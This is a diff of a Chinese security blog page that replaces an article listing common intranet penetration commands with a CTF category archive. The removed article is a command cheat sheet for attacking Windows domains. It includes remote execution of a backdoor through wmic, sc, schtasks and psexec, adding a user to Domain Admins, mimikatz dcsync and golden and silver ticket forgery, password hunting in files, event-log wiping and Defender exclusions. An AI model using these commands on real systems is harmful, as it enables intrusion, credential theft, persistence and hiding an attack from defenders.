@@ -6,17 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>内网渗透常用命令 | uuuuuuuuuzi’Blogs</title>
+  <title>Category: ctf | uuuuuuuuuzi’Blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="信息收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950tracert IP    &#x2F;&#x2F;路由跟踪 route print    &#x2F;&#x2F;打印路由表 arp -a          &#x2F;&#x2F;列出本网段内所有活跃的IP地址 arp -s (ip + mac) &#x2F;&#x2F;绑定mac与i">
-<meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透常用命令">
-<meta property="og:url" content="http://example.com/2021/10/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+  <meta name="description" content="uuuuuuuuuzi’blogs 网络安全|WEB安全|渗透测试|攻防培训">
+<meta property="og:type" content="website">
+<meta property="og:title" content="uuuuuuuuuzi’Blogs">
+<meta property="og:url" content="http://example.com/categories/ctf/index.html">
 <meta property="og:site_name" content="uuuuuuuuuzi’Blogs">
-<meta property="og:description" content="信息收集1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950tracert IP    &#x2F;&#x2F;路由跟踪 route print    &#x2F;&#x2F;打印路由表 arp -a          &#x2F;&#x2F;列出本网段内所有活跃的IP地址 arp -s (ip + mac) &#x2F;&#x2F;绑定mac与i">
+<meta property="og:description" content="uuuuuuuuuzi’blogs 网络安全|WEB安全|渗透测试|攻防培训">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-10-04T11:17:47.742Z">
-<meta property="article:modified_time" content="2021-10-04T15:51:38.895Z">
 <meta property="article:author" content="uuuuuuuuuzi">
 <meta property="article:tag" content="uuuuuuuuuzi’blogs 网络安全|WEB安全|渗透测试|攻防培训">
 <meta name="twitter:card" content="summary">
@@ -179,231 +177,60 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-内网渗透常用命令" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      内网渗透常用命令
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2021" class="archive-year">2021</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2021/10/12/awd-Defence/" class="archive-article-date">
+  	<time datetime="2021-10-12T05:06:04.832Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-12</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2021/10/12/awd-Defence/">自由攻防-Defence部分</a>
     </h1>
   
 
-        
-        <a href="/2021/10/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="archive-article-date">
-  	<time datetime="2021-10-04T11:17:47.742Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">tracert IP    //路由跟踪 </span><br><span class="line">route print    //打印路由表 </span><br><span class="line">arp -a          //列出本网段内所有活跃的IP地址 </span><br><span class="line">arp -s (ip + mac) //绑定mac与ip地址 </span><br><span class="line">arp -d (ip + mac) //解绑mac与ip地址 </span><br><span class="line">nbtscan -r 192.168.16.0/24  //通过小工具nbtscan扫描整个网络 </span><br><span class="line">netsh firewall show config    //查看防火墙策略 </span><br><span class="line">netsh firewall show state     //查看防火墙策略</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.10.%i -w 1 -n 1 | find /i &quot;ttl&quot; //探测存活主机</span><br><span class="line"></span><br><span class="line">net命令</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; xxx /add /domain #添加到域管</span><br><span class="line">net time /domain</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">net group &quot;domain controllers&quot; /domain</span><br><span class="line">net user administrator /domain</span><br><span class="line">nltest /domain_trusts  获取域信任关系</span><br><span class="line">nltest /dclist:</span><br><span class="line">net share</span><br><span class="line">net view \\domainip</span><br><span class="line">net view /domain    查看域/工作组列表</span><br><span class="line">net view /domain:secwing    查看secwing域中 计算机列表</span><br><span class="line">net config Workstation  查询机器属于哪个域</span><br><span class="line">netstat -ano |findstr</span><br><span class="line">net accouts 查看本地密码策略</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set 查看环境变量</span><br><span class="line">nbtstat -A ip   netbiso查询</span><br><span class="line">whoami /all</span><br><span class="line">qwinsta //查看登录情况</span><br><span class="line">query user //查看管理员最近登陆时间</span><br><span class="line">nltest /domain_trusts     //获取域信任信息</span><br><span class="line"></span><br><span class="line">taskkill /f /im </span><br><span class="line">tasklist /svc 查看进程</span><br><span class="line">tasklist /S ip /U domain\username /P /V //查看远程计算机进程列</span><br><span class="line">tracert IP //路由跟踪</span><br><span class="line"></span><br><span class="line">route print //打印路由表</span><br><span class="line">arp -a //列出本网段内所有活跃的IP地址</span><br><span class="line">arp -s （ip + MAC）//绑定mac与ip地址</span><br><span class="line">arp -d （ip + MAC） //解绑mac与ip地址</span><br><span class="line"></span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; /ve</span><br><span class="line">获取最近mstsc登录的记录</span><br><span class="line"></span><br><span class="line">setspn -Q \*/\* SPN列表</span><br></pre></td></tr></table></figure>
-
-<h1 id="文件查找"><a href="#文件查找" class="headerlink" title="文件查找"></a>文件查找</h1> <span id="more"></span> 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用命令查找包含密码的文件</span><br><span class="line">findstr /si password *.txt</span><br><span class="line">findstr /si password *.xml</span><br><span class="line">findstr /si password *.ini</span><br><span class="line">查找文件位置</span><br><span class="line">dir /b /s unattend.xml</span><br><span class="line">dir /b /s web.config</span><br><span class="line">dir /b /s sysprep.inf</span><br></pre></td></tr></table></figure>
-<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid //查看已安装过得补丁，这个很实用</span><br><span class="line">wmic qfe list full /format:htable &gt; hotfixes.htm //详细的补丁安装</span><br><span class="line">wmic qfe //查询补丁信息以及微软提供的下载地址 ping hostname(主机名） //显示该机器名的IP</span><br><span class="line">wmic share get name,path //查看SMB指向的路径</span><br><span class="line">wmic nteventlog get path,filename,writeable //查询系统日志文件存储位置</span><br><span class="line">wmic service list brief //查看进程服务</span><br><span class="line">wmic process list brief //查看进程</span><br><span class="line">wmic startup list brief //查看启动程序信息</span><br><span class="line">wmic product list brief //查看安装程序和版本信息（漏洞利用线索）</span><br><span class="line">wmic startup list full //识别开机启动的程序</span><br><span class="line">wmic process where(description=&quot;mysqld.exe&quot;) &gt;&gt; mysql.log //获取软件安装路径</span><br><span class="line"></span><br><span class="line">wmic /node:ip /user: /p pwd process call create c:\backdoor.exe</span><br><span class="line"></span><br><span class="line">wmic /node /user: /password: process wher e name=&quot;cmd.exe&quot; cll terminate</span><br><span class="line"></span><br><span class="line">wmic /node:10.10.10.11 /user:administrator /password:1qaz@WSX  process call create &quot;cmd.exe /c ipconfig&gt;c:\result.txt&quot;</span><br><span class="line"></span><br><span class="line">WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c &quot;ipconfig&quot;</span><br><span class="line"></span><br><span class="line">wmic /node /user /password process where name=&quot;cmd.exe&quot; get CommandLine</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ password /user:domain\user</span><br><span class="line"></span><br><span class="line">net use [url=file://\\IP\ipc$]\\IP\ipc$[/url] password /user:username@domain</span><br><span class="line"></span><br><span class="line">copy putty.exe \\192.168.0.100\admin$</span><br><span class="line">net time \\192.168.0.100</span><br><span class="line">at \\192.168.0.100 19:45 putty.exe</span><br><span class="line">net use Z: \\192.168.0.100\c$ 将靶机c盘映射到本地</span><br><span class="line">dir \\192.168.17.138\c$</span><br><span class="line">copy test.exe \\192.168.17.138\c$</span><br><span class="line">net use * \\192.168.0.100 /del</span><br><span class="line"></span><br><span class="line">net use * /del /y</span><br><span class="line">net use * /del </span><br><span class="line"></span><br><span class="line">net use 查看会话</span><br><span class="line">net session</span><br></pre></td></tr></table></figure>
-<h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><h2 id="AT-Schtasks"><a href="#AT-Schtasks" class="headerlink" title="AT/Schtasks"></a>AT/Schtasks</h2><ul>
-<li><p>AT命令（win server2012已遗弃）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">建立net use 连接</span><br><span class="line">net use \\192.168.1.100\c$ 1qaz@WSX /user domain\user</span><br><span class="line">复制bat文件到远程计算机</span><br><span class="line">copy exec.bat \\192.168.1.100\c$\windows\debug\exec.bat</span><br><span class="line">查看远程计算机时间</span><br><span class="line">net time \\192.168.1.100</span><br><span class="line">新建远程计划任务</span><br><span class="line">at \\192.168.1.100 21.52 c:\windows\temp\exec.bat</span><br><span class="line">查看远程计划任务列表</span><br><span class="line">at \\192.168.1.100</span><br></pre></td></tr></table></figure></li>
-<li><p>Schtasks</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建任务</span><br><span class="line">schtasks /create /s ip /u administrator /password /ru &quot;system&quot; /tn adduser(名称) /sc DAILY(时间) /tr c:\windows\debug\add.bat /f</span><br><span class="line">运行任务</span><br><span class="line">schtasks /run /s ip /u administrator /p password /tn adduser /i</span><br><span class="line">schtasks /run /tn update /$ 10.10.10.137 /u test \administrator /p 1qaz@WSX</span><br><span class="line">删除任务</span><br><span class="line">schtasks /delete /s ip /u administrator /p password /tn adduser /f</span><br></pre></td></tr></table></figure></li>
-<li><p>sc</p>
-</li>
-</ul>
-<p>服务控制命令，微软内置,配合文件共享，远程创建服务</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">建立ipc连接 执行SC</span><br><span class="line">net use \\192.168.17.138\c$ &quot;admin123&quot; /user:pt007</span><br><span class="line">net use</span><br><span class="line">dir \\192.168.17.138\c$</span><br><span class="line">copy test.exe \\192.168.17.138\c$</span><br><span class="line">创建服务</span><br><span class="line">sc \\remote_ip create services_name binpath= c:\backdoor.exe</span><br><span class="line">sc \\10.10.10.10 create update binpath= c:\programdata\a.bat</span><br><span class="line">启动服务</span><br><span class="line">sc \\remote_ip start services_name</span><br><span class="line">sc \\10.10.10.10 start update</span><br><span class="line">停止服务</span><br><span class="line">sc \\remote_ip stop  serviece_name</span><br><span class="line">sc \\10.10.10.10 stop update</span><br><span class="line">删除服务</span><br><span class="line">sc \\remote_ip delete service_name</span><br><span class="line">sc \\10.10.10.10 delete update</span><br></pre></td></tr></table></figure>
-
-<h1 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h1><h2 id="Netsh端口转发"><a href="#Netsh端口转发" class="headerlink" title="Netsh端口转发"></a>Netsh端口转发</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config //查看防火墙策略</span><br><span class="line"></span><br><span class="line">netsh firewall show state //查看防火墙策略</span><br><span class="line">开启端口转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开防火墙</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;firewallname&quot; protocol=TCP dir=in localip=ip localport=port action=allow</span><br><span class="line"></span><br><span class="line">显示所有转发规则</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line"></span><br><span class="line">删除转发</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport=port listenaddress=ip</span><br><span class="line"></span><br><span class="line">重置</span><br><span class="line">netsh interface portproxy reset</span><br></pre></td></tr></table></figure>
-
-<h1 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.ssh正向端口转发</span><br><span class="line">ssh -L [&lt;local host&gt;:] &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt;&lt;ssh hostname&gt;</span><br><span class="line"></span><br><span class="line">2.ssh反向端口转发</span><br><span class="line">ssh -R [&lt;local host&gt;:]&lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt;&lt;ssh hostname&gt;</span><br><span class="line"></span><br><span class="line">3.ssh socks代理</span><br><span class="line">ssh -D [&lt;local host&gt;:] &lt;local port&gt;&lt;ssh hostname&gt;</span><br></pre></td></tr></table></figure>
-
-<h1 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h1><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">黄金票据的条件要求：</span><br><span class="line">1.域名称</span><br><span class="line">2.域的SID值       whoami /user</span><br><span class="line">3.域的Krbtgt账户NTLM密码哈希</span><br><span class="line">4.伪造用户名</span><br><span class="line"></span><br><span class="line">sekurlsa::pth /user:administrator /domain:&quot;GOD.org&quot; /ntlm:61465a991b168727b65b3644aab823cd</span><br><span class="line">                              登陆用户       域地址          ntlm加密值</span><br><span class="line">这里会弹出一个CMD框  我们先用看看自己是否有权限  dir \\OWA.GOD.org\c$ 【查看域控C盘】</span><br><span class="line"></span><br><span class="line">dir \\\\DC.zkaq.cn\c$</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /user:krbtgt  /domain:       获取krbtgt的密码 [mimikatz 会模拟域控，向目标域控请求账号密码信息]</span><br><span class="line"></span><br><span class="line">提取出里面的sid和hashNTLM</span><br><span class="line"></span><br><span class="line">kerberos::golden /admin:administrator /domain:GOD.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /ticket:administrator.kiribi  [制作票据]</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi      [加载票据]</span><br><span class="line"></span><br><span class="line">直接注入黄金票据</span><br><span class="line"></span><br><span class="line">kerveros::golden /admin:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:domainsid /krbtgt:hash /ptt</span><br><span class="line"></span><br><span class="line">kerberos::purge 清空票据</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">等待管理员登录获取密码</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz # misc::memssp</span><br><span class="line">Injected =)</span><br><span class="line"></span><br><span class="line">mimikatz # exit</span><br></pre></td></tr></table></figure>
-<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户sid</span><br><span class="line">whoami /user</span><br><span class="line"></span><br><span class="line">获取目标计算机哈希</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">1472漏洞</span><br><span class="line">生成白银票据</span><br><span class="line">kerberos::golden /sid:domainsid /domain:test.local /ptt /id:伪造用户ID /target:mdc.test.local /service:cifs /rc:目标计算机hash /user:伪造用户名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery"></a>dsquery</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dsquery.exe user -limit 0#查询用户对象信息</span><br><span class="line">dsquery.exe group -limit 0 #查询组对象信息</span><br><span class="line">dsquery.exe ou -limit 0#查询OU对象信息</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain //列出该域内所有用户名</span><br><span class="line">dsquery server -domain supre.com | dsget server -dnsname -site //搜索域内所有域控制器并显示他们的DNS主机名和站点名称</span><br><span class="line">dsquery contact //寻找目录中的联系人</span><br><span class="line">dsquery subnet  //列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain  //列出该域内分组</span><br><span class="line">dsquery ou  //列出该域内组织单位</span><br><span class="line">dsquery server &amp;&amp; net time /domain  //列出该域内域控制器</span><br><span class="line">dsquery site -o rdn //搜索域中所有站点名称</span><br><span class="line">dsquery group dc=GOD,dc=org |more   搜索在dc=god，dc=org域中的所有组</span><br><span class="line">dsquery.exe computer    #查找目标中的计算机</span><br><span class="line">dsquery.exe site       #查找目录中的组织单位</span><br><span class="line">dsquery.exe server   #查找目录中的AD DC/LDS 实例</span><br></pre></td></tr></table></figure>
-<h2 id="ADfind"><a href="#ADfind" class="headerlink" title="ADfind"></a>ADfind</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist   #列出域控制器名称</span><br><span class="line">AdFind -sc computers_active     #查询当前域中在线的计算机</span><br><span class="line">AdFind -sc computers_active name operatingSystem       #查询当前域中在线的计算机(只显示名称和操作系统)</span><br><span class="line">AdFind.exe -sc computers_active name dnshostname       #查询域中活动的主机,输出主机名和域名</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot;     #查询当前域中所有计算机</span><br><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem       #查询当前域中所有计算机(只显示名称和操作系统)</span><br><span class="line">AdFind -users name   #查询域内所有用户</span><br><span class="line">AdFind -sc gpodmp     #查询所有GPO</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc u:*     #查询域内所有用户详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc u:test   #查询域内特定用户详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc u:test mail     #查询域内特定用户特定信息（mail）</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc u:* -dn     #查询域内所有用户dn信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc u:* -c   #查询域内用户数量</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc g:*     #查询域内所有组详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc g:*Admin       #查询域内组名包含 Admin 的所有组详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc o:*     #查询域内所有OU详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc c:* #查询域内所有计算机详细信息</span><br><span class="line">AdFind -h 10.10.10.10 -u GOD\administrator -up 1qaz@WSX -sc s:*     #查询域内所有站点详细信息</span><br></pre></td></tr></table></figure>
-
-<h2 id="psexec-paexec"><a href="#psexec-paexec" class="headerlink" title="psexec paexec"></a>psexec paexec</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\10.10.10.137 -u test\administrator -p 1qaz@WSX -i cmd.exe</span><br><span class="line"></span><br><span class="line">psexec.exe -accepteula -i -s -d cmd</span><br><span class="line"></span><br><span class="line">paexec.exe \\ip -u domain\user -p pwd cmd.exe -noname </span><br><span class="line">net use \\ip pwd /u:domain\user paexec.exe \\ip cmd.exe </span><br><span class="line"></span><br><span class="line">netsh winhttp sh proxy  查看代理</span><br></pre></td></tr></table></figure>
-
-<h2 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h2><p>端口复用入网</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">winrm quickconfig -q</span><br><span class="line"></span><br><span class="line">winrm s winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br><span class="line"></span><br><span class="line">新增80端口监听</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br><span class="line"></span><br><span class="line">修改5985到80</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Listener?Address=*+Transprot=HTTP @&#123;port=80&#125;</span><br><span class="line"></span><br><span class="line">修改WinRM端口为web端口</span><br><span class="line"></span><br><span class="line">winrs -r:http://xx -u:DC20\administratror -p:1qaz@WSX cmd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><h2 id="wevtutil"><a href="#wevtutil" class="headerlink" title="wevtutil"></a>wevtutil</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el 列出系统中所有日志的名称</span><br><span class="line"></span><br><span class="line">wevtutil cl system  清理系统日志</span><br><span class="line"></span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line"></span><br><span class="line">wevtutil cl security    清理安全日志</span><br><span class="line"></span><br><span class="line">for /f &quot;delims=&quot; %j in(&#x27;wevtutil.exe el&#x27;) do @wevtutil.exe cl &quot;%j&quot; c:\windows\system32\winevt\logs\</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="windows-defender"><a href="#windows-defender" class="headerlink" title="windows defender"></a>windows defender</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&quot;C:\PROGRA~1\WINDOW~1\mpcmdrun.exe&quot; -Restore -ListAll</span><br><span class="line"></span><br><span class="line">powershell -Command Add-MpPreference -ExclusionPath &quot;C:\tmp&quot;</span><br><span class="line">powershell -Command Add-MpPreference -ExclusionExtension&quot;.java&quot;</span><br><span class="line">powershell -Command Add-MpPreference -ExclusionProcess&quot;*.exe&quot;</span><br><span class="line"></span><br><span class="line">powershell -Command Get-MpPreference</span><br></pre></td></tr></table></figure>
-
